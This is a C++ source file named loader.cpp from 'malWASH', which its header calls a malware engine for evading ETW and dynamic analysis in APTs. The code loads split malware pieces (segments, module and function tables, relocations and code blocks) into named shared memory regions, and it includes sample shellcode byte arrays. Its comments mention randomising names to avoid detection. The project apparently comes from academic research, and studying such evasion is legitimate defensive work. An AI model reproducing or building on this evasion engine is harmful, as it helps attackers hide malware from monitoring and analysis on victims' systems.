//-----------------------------------------------------------------------------------------------------------
/*
**	                             ,,                                                        
**	                           `7MM `7MMF'     A     `7MF' db       .M"""bgd `7MMF'  `7MMF'
**	                             MM   `MA     ,MA     ,V  ;MM:     ,MI    "Y   MM      MM  
**	`7MMpMMMb.pMMMb.   ,6"Yb.    MM    VM:   ,VVM:   ,V  ,V^MM.    `MMb.       MM      MM  
**	  MM    MM    MM  8)   MM    MM     MM.  M' MM.  M' ,M  `MM      `YMMNq.   MMmmmmmmMM  
**	  MM    MM    MM   ,pm9MM    MM     `MM A'  `MM A'  AbmmmqMA   .     `MM   MM      MM  
**	  MM    MM    MM  8M   MM    MM      :MM;    :MM;  A'     VML  Mb     dM   MM      MM  
**	.JMML  JMML  JMML.`Moo9^Yo..JMML.     VF      VF .AMA.   .AMMA.P"Ybmmd"  .JMML.  .JMML.
**	               
**
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs 
**
**  ** The execution engine ** - Version 2.0
**
**
**	loader.cpp
**
**	This file loads all the pieces of malware to shared memory. This file is useless, if we use the "pack"
**	functionality, where we insert all pieces, in a .c file.
**
**
**	Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  June - August 2015 
*/
//-----------------------------------------------------------------------------------------------------------
#include "stdafx.h"
#include "malwash.h"
#include <windows.h>


void *segbase[SEGMTABSIZE];									// store segment base addresses
//-----------------------------------------------------------------------------------------------------------
#ifndef __VAR_10_LOAD_BLOCKS_N_META_FROM_TABLES__			// we only need it for file load

/*
**  filesize(): Calculate the file size of an open file
**
**  Return Value: The file size.
*/
long int filesize( FILE *fp )
{
    long int flsz;

    fseek(fp, 0L, SEEK_END);								// go to the end
    flsz = ftell( fp );										// get offset
    fseek(fp, 0L, SEEK_SET);								// rewind!

    return flsz;											// return size
}

#endif
// ----------------------------------------------------------------------------------------------------------
/*
**	crtshreg(): Create a new shared region
**
**	Arguments: regnam (char*) : Name of shared region (can be a random name) 
**             size   (uint)  : Size of requested shared region
**			   	
**	Return Value: A unsigned char pointer to the shared region. If any errors occured, fatal is called.
*/
// ----------------------------------------------------------------------------------------------------------
LPBYTE crtshreg( char regnam[], uint size, void* baseaddr=NULL )
{	
	//wchar_t fullregnam[(MAXSEGNAMELEN<<1) + 16] = {0};		// store UNICODE name here
	char fullregnam[MAXSEGNAMELEN + 16] = {0};				// store UNICODE name here
	HANDLE	hMapFile = 0;									// memory map file handle
	LPBYTE	shptr = 0;										// a pointer to shared region


	// convert char* to wchar_t* (assume no errors)
	// If regname has length MAXSEGNAMELEN, we have to reserve MAXSEGNAMELEN*2 space for fullregnam
	//swprintf_s(fullregnam,(MAXSEGNAMELEN<<1) + 16, L"Global\\%hs", regnam);
	sprintf_s(fullregnam,MAXSEGNAMELEN + 16, "Global\\%hs", regnam);

    // create a file-mapping kernel object which used to refer the file buffer of a given file
    if( (hMapFile = CreateFileMappingA(
                    INVALID_HANDLE_VALUE,					// use paging file
                    NULL,									// default security
                    PAGE_READWRITE,							// read/write access
                    0,										// maximum object size (high-order DWORD)
                    size,									// maximum object size (low-order DWORD)
                    fullregnam								// name of mapping object
               )) == NULL )									// error occured ?
        fatal("Can't create file mapping object '%s' (errno %d).", regnam, GetLastError());

    // map a buffer referred to by file mapping object to the local process space of the current process
	if( (shptr = (LPBYTE) MapViewOfFileEx(
                    hMapFile,								// handle to map object
                    FILE_MAP_ALL_ACCESS,					// read/write permission
                    0,										// high-order 32 bits of file offset
                    0,										// low-order 32 bits of file offset
                    size,									// number of bytes to map
					baseaddr								// base address (NULL if we don't care)
                )) == NULL ) {								// does an error occured ?
        CloseHandle(hMapFile);								// close memory mapped file
		fatal("Can't map view of file '%s' (errno %d).", regnam, GetLastError());      
    }
	
	return shptr;											// return pointeer to shared region
}

//-----------------------------------------------------------------------------------------------------------
// reassemble block arrays to reconstruct the large arrays
//-----------------------------------------------------------------------------------------------------------
void reasm( void )
{

}

// ----------------------------------------------------------------------------------------------------------
#ifdef __VAR_10_LOAD_BLOCKS_N_META_FROM_TABLES__			// load segments from constant arrays

//
// The arrays below are a small sample, for debugging purposes only. our IDA plugin will generate
// will put the real arrays here
//
#ifdef __0__
byte funtab[] = { "\x00\x00\x41\x6c\x6c\x6f\x63\x43\x6f\x6e\x73\x6f\x6c\x65\x00" };
byte modtab[] = { "\x00\x00\x6b\x65\x72\x6e\x65\x6c\x33\x32\x2e\x64\x6c\x6c\x0a" };
byte segtab[] = { "\x00\x00\x5f\x72\x64\x61\x74\x61\x0a" };
uint blklen[] = { 106,  42, 0 };
uint thdtab[] = { 0, 0 };
uint initab[] = { 0, 2, 0x928, 0, 0, 0 };

byte _text_411824[] = { "\x24\x18\x41\x00\x2c\x18\x41\x00\x16\x15\x41\x00\x3a\x15\x41\x00" };
byte _data[] = { "\x00\x60\x41\x00\x08\x60\x41\x00\x4e\xe6\x40\xbb\xb1\x19\xbf\x44" };
byte *supsegm[] = { _text_411824,  _data,  0 };
uint seglen[] = { 8,  8, 0 };

byte blk_001[] = { "\x57\x41\x53\x48\x01\x00\x02\x00\x00\x00\x42\x42\x4c\x4b\x36\x00\x55\x8b\xec\x83\x54"
				   "\x53\x56\x57\xff\x15\x70\x72\x41\x00\x6a\x00\x68\x58\x47\x41\x00\xff\x15\x94\x73\x41"
				   "\x00\x89\x45\xfc\x6a\x00\x8b\x45\xfc\x50\xff\x15\x98\x73\x41\x00\x68\x20\x13\x41\x00"
				   "\x53\xbb\x02\x00\x00\x00\x53\x45\x47\x4d\x12\x00\x00\x00\x46\x55\x4e\x43\x0b\x00\x02"
				   "\x00\x18\x00\x11\x00\x27\x00\x1f\x00\x44\x55\x50\x4c\x48\x45\x41\x50\x45\x4e\x44\x57" };
byte blk_002[] = { "\x57\x41\x53\x48\x02\x00\x03\x00\x00\x00\x42\x42\x4c\x4b\x06\x00\x53\xbb\x03\x00\x00"
				   "\x00\x53\x45\x47\x4d\x46\x55\x4e\x43\x44\x55\x50\x4c\x48\x45\x41\x50\x45\x4e\x44\x57" };
byte *supblk[] = { blk_001, blk_002, 0 };

uint funtablen = 15;
uint modtablen = 15;
uint segtablen = 9;
uint initablen = 1;
#endif 


// ----------------------------------------------------------------------------------------------------------
void loadsegms( void )
{
	BYTE	*segm;											// pointer to segment in shared region
	uint	i = 0;											// iterator


	for(byte *p=supsegm[0]; p;  p=supsegm[++i])				// for each segment in NULL terminating suptab 
	{
		shctrl->segm[i].segmid = i;							// set index
		shctrl->segm[i].startEA = *(uint*)p;				// first 4 bytes is start RVA
		shctrl->segm[i].endEA   = *(uint*)(p + 4);			// next  4 bytes is end RVA
		
		// the name can be random to avoid detection. However we choose such names to make debugging easier.
		sprintf_s(shctrl->segm[i].name, 6, "seg%02d", shctrl->segm[i].segmid);

		segm = crtshreg(shctrl->segm[i].name, seglen[i]-8);	// allocate a shared region for this segment

		segbase[i] = segm;									// store base address (we need it for initab relocations)

		memcpy(segm, (void*)(p+8), seglen[i]-8);			// copy const array to shared region
	}
}
// ----------------------------------------------------------------------------------------------------------
void loadfuntab( void )
{
	memcpy(&shctrl->funtab, funtab, funtablen);				// just copy from const array to shared region
}
// ----------------------------------------------------------------------------------------------------------
void loadmodtab( void )
{
	uint	i, j, k;										// we need 3 iterators
	
	for( i=0, k=0; i<modtablen; i++ )						// for each character in modtab (i++ is for skipping newline)
	{		
		i += 2;												// first 2 bytes is module id. Skip them

		for( j=0; modtab[i]!='\n'; j++ )					// stop copying when you reach a newline
			shctrl->modl[k].name[j] = modtab[i++];			// copy dll name

		k++;												// get next entry in modl table
	}
}
// ----------------------------------------------------------------------------------------------------------
void loadthdtab( void )
{
	// read up to NMAXTHREADS-1 threads 
	for(uint i=1, j=0; i<NMAXTHREADS && thdtab[j]; i++, j+=2 ) {	// slot #0 is reserved for main thread
		shctrl->thrdrtn[i] = thdtab[j];
		shctrl->nxtblk [i] = thdtab[j+1];
	}

}
// ----------------------------------------------------------------------------------------------------------
void loadinitab( void )
{
	for(uint i=0; i<initablen; i+=3 )						// for each entry in initab
		// relocate pointer
		*(uint*)((uint)segbase[ initab[3*i] ] + initab[3*i+2]) = 
		*(uint*)((uint)segbase[ initab[3*i] ] + initab[3*i+2]) - shctrl->segm[initab[3*i+1]].startEA +
			    (SEGMBASEADDR + initab[3*i+1]*SEGMNXTOFF);
}
// ----------------------------------------------------------------------------------------------------------
void loadblks( void )
{
	char	blknam[16] = {0};								// block ID name
	BYTE	*blkptr;										// block pointer to shared region
	uint	blksz;											// block size
	

	for( uint i=0; i<shctrl->nblks; i++ )					// store each block in a separate region
	{
		printf( "[+] Loading block #%d... ", i+1 );
		
		sprintf_s(blknam, 16, "%d", i+1 );					// convert ID to string

		blksz  = blklen[i];									// get block size
		blkptr = crtshreg(blknam, blksz);					// create shared region

		memcpy(blkptr, supblk[i], blksz );

		if( *(ushort*)(blkptr + 4) < MAXNBLKS )				// overflow?
			strcpy_s(shctrl->blk[*(ushort*)(blkptr+4) ].name, 8, blknam);
		else fatal("Overflow detected in block #%d", i);

		printf( "Done.\n" );
	}
}
// ----------------------------------------------------------------------------------------------------------

#else														// load blocks and metadata from files
// ----------------------------------------------------------------------------------------------------------
/*
**	loadsegms(): Load segment table in shared control region, and then load its corresponding segments to 
**		separate shared regions.
**
**	Arguments: None.
**
**	Return Value: None. If ant occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadsegms( void )
{
// define some variadic MACROs
#define closenfatal(fp, msg, ...)        { fclose(fp); fatal(msg, ##__VA_ARGS__); }			
#define closenfatal2(fp, fp2,  msg, ...) { fclose(fp); fclose(fp2); fatal(msg,  ##__VA_ARGS__); }

// shortcut of segment length
#define SEGLEN shctrl->segm[i].endEA - shctrl->segm[i].startEA


	char segnam[MAXSEGNAMELEN];								// segment name
	FILE *stfp, *segfp;										// our file pointers
	BYTE *segm;												// pointer to segment in shared region
	
	
	if( fopen_s(&stfp, ".segtab", "rb") )					// try to open segment table
		fatal("Cannot open .segtab");

	// as long as there are data in it (!feof(stfp) won't work here, as we parse all segtab,
	// but we haven't reach the EOF yet)
	for(uint i=0; fread(&shctrl->segm[i].segmid, 1, 2, stfp) == 2; i++ )						
	{
		if( !fgets(segnam, MAXSEGNAMELEN, stfp)  )			// read segment name
			closenfatal(stfp, "Cannot read segment's %u info", i);

		if( segnam[0] == '_' ) segnam[0] = '.';				// patch 1st character
		segnam[strlen(segnam)-1] = '\0';					// remove newline from name

		printf( "[+] Loading segment #%d %s... ", i, segnam );


		if( fopen_s(&segfp, segnam, "rb") )					// try to open segment file
			closenfatal(stfp, "Cannot open %s", segnam);
		
		if( fread(&shctrl->segm[i].startEA, 1, 4, segfp) != 4 ||
			fread(&shctrl->segm[i].endEA,   1, 4, segfp) != 4 )
				closenfatal2(segfp, stfp, "Cannot read %s EA", segnam);
		
		// the name can be random to avoid detection. However we choose such names to make debugging easier.
		sprintf_s(shctrl->segm[i].name, 6, "seg%02d", shctrl->segm[i].segmid);


		segm = crtshreg(shctrl->segm[i].name, SEGLEN);		// allocate a shared region for this segment

		segbase[i] = segm;									// store base address (we need it for initab relocations)

		if( fread(segm, 1, SEGLEN, segfp) != SEGLEN )		// try to read the actual segment
			closenfatal2(segfp, stfp, "Cannot read %s segment", segnam);

		fclose( segfp );									// we don't really care about errors here :P

		printf( "Done.\n" );
	}

	fclose( stfp );											// close segment table file pointer

#undef SEGLEN
#undef closenfatal2
#undef closenfatal
}
// ----------------------------------------------------------------------------------------------------------
/*
**	loadfuntab(): Load function table in the shared control region.
**
**	Arguments: None.
**
**	Return Value: None. If an error occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadfuntab( void )
{
	FILE *fp;												// our file pointer
	
	if( fopen_s(&fp, ".funtab", "rb") )						// try to open function table
		fatal("Cannot open .funtab");

	fread(&shctrl->funtab, 1, FUNTBLSIZE, fp);				// assume no errors here
	
	fclose( fp );											// we don't really care about errors here :P
}
// ----------------------------------------------------------------------------------------------------------
/*
**	loadmodtab(): Load module table in the shared control region. Work similar with segment table.
**
**	Arguments: None.
**
**	Return Value: None. If an error occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadmodtab( void )
{
// define a variadic MACRO
#define closenfatal(fp, msg, ...)       { fclose(fp); fatal(msg, ##__VA_ARGS__); }			

	FILE	*fp;											// our file pointer
	ushort	modid;											// module ID (doesn't really matters, as IDs are
															// sequential starting from 0)

	if( fopen_s(&fp, ".modtab", "rb") )						// try to open module table
		fatal("Cannot open .modtab");

	
	// as long as there are data in it (!feof(stfp) won't work here, as we parse all modtab,
	// but we haven't reach the EOF yet).
	for(uint i=0; fread(&modid, 1, 2, fp) == 2; i++ )						
	{
		uint	j;											// local iterator

		if( !fgets(shctrl->modl[i].name, MAXMODNAMELEN, fp)  )		
			closenfatal(fp, "Cannot read segment's %u info", i);
	
		for(j=0; shctrl->modl[i].name[j]!='\n'; j++ )		// trail newline from the end
			;
	
		shctrl->modl[i].name[j] = '\0';						// upon exit, j will point to newline
	}

	fclose( fp );											// we don't really care about errors here :P
}
// ----------------------------------------------------------------------------------------------------------
/*
**	loadthdtab(): Load thread table in the shared control region. Work similar with segment table.
**
**	Arguments: None.
**
**	Return Value: None. If an error occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadthdtab( void )
{
	FILE	*fp;											// our file pointer
															

	if( fopen_s(&fp, ".thdtab", "rb") )						// try to open module table
		fatal("Cannot open .thdtab");

	// read up to NMAXTHREADS-1 threads 
	for(uint i=1; i<NMAXTHREADS && !feof(fp); i++ ) {		// slot #0 is reserved for main thread
		fread(&shctrl->thrdrtn[i], 1, 4, fp);				// read thread entry routine
		fread(&shctrl->nxtblk [i], 1, 2, fp);				// and its start block id
	}

	fclose( fp );											// we don't really care about errors here :P
}
// ----------------------------------------------------------------------------------------------------------
/*
**	loadinitab(): Load initialized pointer table in shared control region
**
**	Arguments: None.
**
**	Return Value: None. If ant occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadinitab( void )
{
	FILE	*itfp;											// our file pointer	
	ushort	srcseg, dstseg;									// source and destion segment indices
	uint	segoff;											// pointer offset within segment
	

	if( fopen_s(&itfp, ".initab", "rb") )					// try to open segment table
		fatal("Cannot open .initab");

	// as long as there are data in it (!feof(itfp) won't work here, as we parse all segtab,
	// but we haven't reach the EOF yet)
	for(uint i=0; fread(&srcseg, 1, 2, itfp) == 2; i++ )						
	{
		fread(&dstseg, 1, 2, itfp);							// read destination segment index
		fread(&segoff, 1, 4, itfp);							// read offset within segment

		if( segoff > shctrl->segm[srcseg].endEA - shctrl->segm[srcseg].startEA )
			continue;										// prevent overflows

		// relocate pointer
		*(uint*)((uint)segbase[srcseg] + segoff) = 
		*(uint*)((uint)segbase[srcseg] + segoff) - shctrl->segm[dstseg].startEA +
			    (SEGMBASEADDR + dstseg*SEGMNXTOFF);
	}

	fclose( itfp );											// close segment table file pointer
}
// ----------------------------------------------------------------------------------------------------------
/*
**	loadblks(): Load program's blocks
**
**	Arguments: None.
**
**	Return Value: None. If an error occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadblks( void )
{
	char	blknam[16] = {0};								// block ID name
	BYTE	*blkptr;										// block pointer to shared region
	uint	blksz;											// block size
	FILE	*fp;											// our file pointer


	for( uint i=1; i<=shctrl->nblks; i++ )					// store each block in a separate region
	{
		printf( "[+] Loading block #%d... ", i-1 );

		sprintf_s(blknam, 16, "%d", i );					// convert ID to string

		if( fopen_s(&fp, blknam, "rb") )					// try to open block table
			fatal("Cannot open block %s", blknam);
		
		blksz  = filesize(fp);								// get block size
		blkptr = crtshreg(blknam, blksz);					// create shared region

		if( fread(blkptr, 1, blksz, fp) != blksz ) {		// read the whole block
			fclose( fp );									// close file first
			fatal("Cannot read block %s", blknam);
		}

		fclose( fp );										// we don't really care about errors here :P

		if( *(ushort*)(blkptr + 4) < MAXNBLKS )				// overflow?
			strcpy_s(shctrl->blk[*(ushort*)(blkptr+4) ].name, 8, blknam);
		else fatal("Overflow detected in block #%d", i);

		printf( "Done.\n" );
	}
}
//-----------------------------------------------------------------------------------------------------------
#endif
//-----------------------------------------------------------------------------------------------------------
